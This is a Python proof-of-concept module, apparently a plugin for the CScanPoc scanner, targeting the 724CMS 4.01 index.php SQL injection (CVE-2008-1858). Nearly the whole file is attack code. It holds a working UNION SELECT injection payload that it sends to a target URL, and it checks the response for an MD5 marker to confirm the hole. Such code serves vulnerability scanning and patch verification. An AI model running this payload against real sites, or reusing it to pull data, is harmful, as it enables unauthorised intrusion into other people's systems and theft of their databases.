# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '724CMS_0000'  # 平台漏洞编号
    name = '724CMS 4.01 Enterprise - index.php SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2008-04-07'  # 漏洞公布时间
    desc = '''
        724CMS index.php文件注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/5400/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2008-1858 '  # cve编号
    product = '724CMS'  # 漏洞组件名称
    product_version = '4.01'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a4562b37-dfbc-44f0-b8ab-1dcbd8e43a29'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/index.php?ID=1 UNION SELECT 1,md5(666),3,4,5,6,7,8--"
            verify_url = '{target}'.format(target=self.target) + payload
            content = requests.get(verify_url).text
            if 'fae0b27c451c728867a567e8c1bb4e53' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
